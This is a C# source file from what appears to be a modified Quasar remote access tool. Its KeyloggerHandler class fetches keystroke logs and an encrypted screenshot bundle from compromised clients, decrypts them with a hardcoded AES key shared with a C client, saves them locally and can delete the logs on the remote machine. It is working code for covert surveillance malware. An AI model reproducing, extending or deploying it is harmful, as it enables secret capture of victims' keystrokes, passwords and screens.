using Quasar.Common.Cryptography;
using Quasar.Common.Helpers;
using Quasar.Common.Messages;
using Quasar.Common.Enums;
using Quasar.Common.Models;
using Quasar.Common.Networking;
using Quasar.Server.Models;
using Quasar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Text;

namespace Quasar.Server.Messages
{
    /// <summary>
    /// Handles messages for the interaction with the remote keylogger.
    /// </summary>
    public class KeyloggerHandler : MessageProcessorBase<string>, IDisposable
    {
        /// <summary>
        /// The client which is associated with this keylogger handler.
        /// </summary>
        private readonly Client _client;

        /// <summary>
        /// The file manager handler used to retrieve keylogger logs from the client.
        /// </summary>
        private readonly FileManagerHandler _fileManagerHandler;

        /// <summary>
        /// The remote path of the keylogger logs directory.
        /// </summary>
        private string _remoteKeyloggerDirectory;

        /// <summary>
        /// Client path to the encrypted screenshot bundle (e.g. %TEMP%\wctBG958.tmp).
        /// </summary>
        private string _remoteScreenshotBundlePath;

        /// <summary>
        /// Remote paths of screenshot-bundle downloads started from this handler (matched on transfer completion).
        /// </summary>
        private readonly List<string> _pendingScreenshotRemotePaths = new List<string>();

        private readonly object _pendingScreenshotLock = new object();

        private enum KeyloggerDirPendingAction { None, ListLogs, DownloadScreenshotBundle }

        private KeyloggerDirPendingAction _pendingKeyloggerDirAction = KeyloggerDirPendingAction.None;

        /// <summary>
        /// The amount of all running log transfers.
        /// </summary>
        private int _allTransfers;

        /// <summary>
        /// The amount of all completed log transfers.
        /// </summary>
        private int _completedTransfers;

        /// <summary>
        /// AES instance with hardcoded key for C client keylog decryption (same master key as remote_keylogger_aes.c).
        /// </summary>
        private static readonly Aes256 CClientAes = new Aes256("KeylogAES256Key01234567890123456");

        /// <summary>
        /// Initializes a new instance of the <see cref="KeyloggerHandler"/> class using the given client.
        /// </summary>
        /// <param name="client">The associated client.</param>
        public KeyloggerHandler(Client client) : base(true)
        {
            _client = client;
            _fileManagerHandler = new FileManagerHandler(client, "Logs\\");
            _fileManagerHandler.DirectoryChanged += DirectoryChanged;
            _fileManagerHandler.FileTransferUpdated += FileTransferUpdated;
            _fileManagerHandler.ProgressChanged += StatusUpdated;
            MessageHandler.Register(_fileManagerHandler);
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetKeyloggerLogsDirectoryResponse;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetKeyloggerLogsDirectoryResponse logsDirectory:
                    Execute(sender, logsDirectory);
                    break;
            }
        }

        /// <summary>
        /// Retrieves the keylogger logs and begins downloading them.
        /// </summary>
        public void RetrieveLogs()
        {
            _pendingKeyloggerDirAction = KeyloggerDirPendingAction.ListLogs;
            _client.Send(new GetKeyloggerLogsDirectory());
        }

        /// <summary>
        /// Fetches the client's encrypted screenshot bundle and extracts JPEGs into the Logs folder.
        /// </summary>
        public void RetrieveScreenshots()
        {
            _pendingKeyloggerDirAction = KeyloggerDirPendingAction.DownloadScreenshotBundle;
            _client.Send(new GetKeyloggerLogsDirectory());
        }

        /// <summary>
        /// Deletes all keylogger log files on the remote client by removing the logs directory.
        /// </summary>
        public void DeleteLogsOnClient()
        {
            if (string.IsNullOrEmpty(_remoteKeyloggerDirectory))
            {
                OnReport("Logs directory unknown (retrieve logs first)");
                return;
            }

            _fileManagerHandler.DeleteFile(_remoteKeyloggerDirectory, FileType.Directory);
            OnReport("Requested deletion of logs on client");
        }

        private void Execute(ISender client, GetKeyloggerLogsDirectoryResponse message)
        {
            _remoteKeyloggerDirectory = message.LogsDirectory ?? "";
            _remoteScreenshotBundlePath = message.ScreenshotBundlePath ?? "";

            switch (_pendingKeyloggerDirAction)
            {
                case KeyloggerDirPendingAction.ListLogs:
                    client.Send(new GetDirectory { RemotePath = _remoteKeyloggerDirectory });
                    break;
                case KeyloggerDirPendingAction.DownloadScreenshotBundle:
                    if (string.IsNullOrEmpty(_remoteScreenshotBundlePath))
                        OnReport("Screenshot bundle path not available from client");
                    else
                    {
                        lock (_pendingScreenshotLock)
                            _pendingScreenshotRemotePaths.Add(_remoteScreenshotBundlePath);
                        _fileManagerHandler.BeginDownloadFile(_remoteScreenshotBundlePath,
                            Path.GetFileName(_remoteScreenshotBundlePath), true);
                        OnReport("Downloading screenshot bundle...");
                    }
                    break;
                default:
                    /* Backward compatibility: if something triggers this without a pending action, list logs. */
                    if (!string.IsNullOrEmpty(_remoteKeyloggerDirectory))
                        client.Send(new GetDirectory { RemotePath = _remoteKeyloggerDirectory });
                    break;
            }

            _pendingKeyloggerDirAction = KeyloggerDirPendingAction.None;
        }

        private string GetDownloadProgress(int allTransfers, int completedTransfers)
        {
            decimal progress = Math.Round((decimal)((double)completedTransfers / (double)allTransfers * 100.0), 2);
            return $"Downloading...({progress}%)";
        }

        private void StatusUpdated(object sender, string value)
        {
            // called when directory does not exist or access is denied
            OnReport($"No logs found ({value})");
        }

        private static string SanitizeScreenshotFileName(string name)
        {
            foreach (char c in Path.GetInvalidFileNameChars())
                name = name.Replace(c, '_');
            return name;
        }

        private void ProcessScreenshotBundle(string localPath)
        {
            byte[] raw;
            try
            {
                raw = File.ReadAllBytes(localPath);
            }
            catch (Exception ex)
            {
                OnReport("Failed to read screenshot bundle: " + ex.Message);
                return;
            }

            string logsDir = Path.Combine(_client.Value.DownloadDirectory, "Logs");
            if (!Directory.Exists(logsDir))
            {
                try
                {
                    Directory.CreateDirectory(logsDir);
                }
                catch (Exception ex)
                {
                    OnReport("Logs directory error: " + ex.Message);
                    return;
                }
            }

            const byte Sm = (byte)'S', Cm = (byte)'C', One = (byte)'1';
            int pos = 0;
            int saved = 0;
            var taken = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            while (pos + 8 <= raw.Length)
            {
                if (!(raw[pos] == Sm && raw[pos + 1] == Cm && raw[pos + 2] == Sm && raw[pos + 3] == One))
                {
                    pos++;
                    continue;
                }

                int segLen = raw[pos + 4] | (raw[pos + 5] << 8) | (raw[pos + 6] << 16) | (raw[pos + 7] << 24);
                if (segLen < 48 || pos + 8 + segLen > raw.Length)
                    break;

                byte[] segment = new byte[segLen];
                Buffer.BlockCopy(raw, pos + 8, segment, 0, segLen);
                pos += 8 + segLen;

                byte[] plain;
                try
                {
                    plain = CClientAes.Decrypt(segment);
                }
                catch
                {
                    continue;
                }

                if (plain == null || plain.Length < 8 + 2)
                    continue;

                ulong ms = BitConverter.ToUInt64(plain, 0);
                var jpeg = new byte[plain.Length - 8];
                Buffer.BlockCopy(plain, 8, jpeg, 0, jpeg.Length);
                if (jpeg.Length < 2 || jpeg[0] != 0xFF || jpeg[1] != 0xD8)
                    continue;

                string baseName = SanitizeScreenshotFileName(
                    DateTimeOffset.FromUnixTimeMilliseconds((long)ms).ToUniversalTime()
                        .ToString("yyyy-MM-dd_HH-mm-ss_fff", CultureInfo.InvariantCulture));
                string fname = baseName + ".jpg";
                int dup = 2;
                while (taken.Contains(fname) || File.Exists(Path.Combine(logsDir, fname)))
                {
                    fname = baseName + "_" + dup + ".jpg";
                    dup++;
                }
                taken.Add(fname);

                try
                {
                    File.WriteAllBytes(Path.Combine(logsDir, fname), jpeg);
                    saved++;
                }
                catch
                {
                    /* skip */
                }
            }

            try
            {
                if (saved > 0)
                    File.Delete(localPath);
            }
            catch
            {
                /* keep bundle if locked */
            }

            if (raw.Length == 0)
                OnReport("Screenshot bundle is empty");
            else if (saved == 0)
                OnReport("No valid screenshots found in bundle (or decryption failed)");
            else
                OnReport(saved == 1 ? "Saved 1 screenshot to Logs" : $"Saved {saved} screenshots to Logs");
        }

        private void DirectoryChanged(object sender, string remotePath, FileSystemEntry[] items)
        {
            /* Only consider real file entries that look like keylogger logs (.bin from C client, .html from C# client). */
            var logItems = Array.FindAll(items, i =>
                i.EntryType == FileType.File &&
                (i.Name.EndsWith(".bin", StringComparison.OrdinalIgnoreCase) ||
                 i.Name.EndsWith(".html", StringComparison.OrdinalIgnoreCase)));

            if (logItems.Length == 0)
            {
                OnReport("No logs found");
                return;
            }

            _allTransfers = logItems.Length;
            _completedTransfers = 0;
            OnReport(GetDownloadProgress(_allTransfers, _completedTransfers));

            foreach (var item in logItems)
            {
                // don't escape from download directory
                if (FileHelper.HasIllegalCharacters(item.Name))
                {
                    // disconnect malicious client
                    _client.Disconnect();
                    return;
                }

                /* Server always uses .html for keylog files; client may send .bin (C client) or .html (C#). */
                string localName = item.Name.EndsWith(".bin", StringComparison.OrdinalIgnoreCase)
                    ? Path.ChangeExtension(item.Name, ".html")
                    : item.Name;
                _fileManagerHandler.BeginDownloadFile(Path.Combine(_remoteKeyloggerDirectory, item.Name), localName, true);
            }
        }

        private void FileTransferUpdated(object sender, FileTransfer transfer)
        {
            if (transfer.Status == "Completed")
            {
                try
                {
                    string localScreenshotPath = null;
                    lock (_pendingScreenshotLock)
                    {
                        int idx = _pendingScreenshotRemotePaths.FindIndex(p =>
                            string.Equals(p, transfer.RemotePath, StringComparison.OrdinalIgnoreCase));
                        if (idx >= 0)
                        {
                            _pendingScreenshotRemotePaths.RemoveAt(idx);
                            localScreenshotPath = transfer.LocalPath;
                        }
                    }
                    if (localScreenshotPath != null)
                    {
                        ProcessScreenshotBundle(localScreenshotPath);
                        return;
                    }

                    _completedTransfers++;
                    string content = null;
                    /* Try C client format: [magic "KLS1"][len4][seg]... or legacy single blob. */
                    try
                    {
                        byte[] raw = File.ReadAllBytes(transfer.LocalPath);
                        if (raw.Length >= 48)
                        {
                            var sb = new StringBuilder();
                            int pos = 0;
                            int decryptedSegments = 0;
                            const byte K = (byte)'K', L = (byte)'L', S = (byte)'S', One = (byte)'1';
                            while (pos + 8 <= raw.Length)
                            {
                                if (!(raw[pos] == K && raw[pos + 1] == L && raw[pos + 2] == S && raw[pos + 3] == One))
                                {
                                    pos++;
                                    continue;
                                }

                                int segLen = raw[pos + 4] | (raw[pos + 5] << 8) | (raw[pos + 6] << 16) | (raw[pos + 7] << 24);
                                if (segLen < 48 || pos + 8 + segLen > raw.Length)
                                    break; // likely trailing partial segment while file is still being written

                                byte[] segment = new byte[segLen];
                                Buffer.BlockCopy(raw, pos + 8, segment, 0, segLen);
                                pos += 8 + segLen;
                                sb.Append(Encoding.UTF8.GetString(CClientAes.Decrypt(segment)));
                                decryptedSegments++;
                            }

                            if (decryptedSegments > 0 && sb.Length > 0)
                                content = sb.ToString();
                            else if (content == null && raw.Length >= 48)
                            {
                                // Legacy C client blob format (single encrypted payload without segment headers).
                                content = Encoding.UTF8.GetString(CClientAes.Decrypt(raw));
                            }
                        }
                    }
                    catch { /* not C client format or corrupt */ }
                    if (content == null || content.Length < 10)
                    {
                        /* Try C# client format (per-client encryption key). */
                        try
                        {
                            content = FileHelper.ReadLogFile(transfer.LocalPath, _client.Value.AesInstance);
                        }
                        catch
                        {
                            OnReport("Decryption failed for " + Path.GetFileName(transfer.LocalPath));
                            content = null;
                        }
                    }
                    if (content != null)
                        File.WriteAllText(transfer.LocalPath, content, Encoding.UTF8);
                    else
                        OnReport("Decryption failed for " + Path.GetFileName(transfer.LocalPath));

                    if (content != null)
                    {
                        OnReport(_allTransfers == _completedTransfers
                            ? "Successfully retrieved all logs"
                            : GetDownloadProgress(_allTransfers, _completedTransfers));
                    }
                }
                catch (Exception)
                {
                    OnReport("Failed to decrypt and write logs");
                }
            }
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                MessageHandler.Unregister(_fileManagerHandler);
                _fileManagerHandler.ProgressChanged -= StatusUpdated;
                _fileManagerHandler.FileTransferUpdated -= FileTransferUpdated;
                _fileManagerHandler.DirectoryChanged -= DirectoryChanged;
                _fileManagerHandler.Dispose();
            }
        }
    }
}
